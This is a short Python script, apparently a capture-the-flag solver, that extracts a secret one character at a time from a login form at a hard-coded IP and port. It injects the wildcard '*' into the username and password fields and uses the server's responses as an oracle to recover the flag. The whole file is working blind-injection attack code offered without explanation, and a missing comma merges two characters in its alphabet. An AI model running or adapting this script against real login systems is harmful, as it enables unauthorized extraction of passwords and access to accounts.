# Write Python 3 code in this online editor and run it.
import requests;

list = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','~','!','@','#','$','%','^','&','-','_','+','=','{','}',']','[','|','?',';'
     ':','<','>','0','1','2','3','4','5','6','7','8','9'};
flag=""
for j in range(1,40):
    for i,temp in enumerate(list):
        #print(i)
        temp=flag+temp
        url="http://157.245.33.77:30219/login"
        myobj = {'username': '*','password':f'{temp}*'}
        x=requests.post(url,data=myobj)
        if "Reese" in x.text:
            print("");
        elif "HTTP ERROR 500" in x.text:
            print("")
        else:
            flag=temp
            print(f'{flag}');
            break
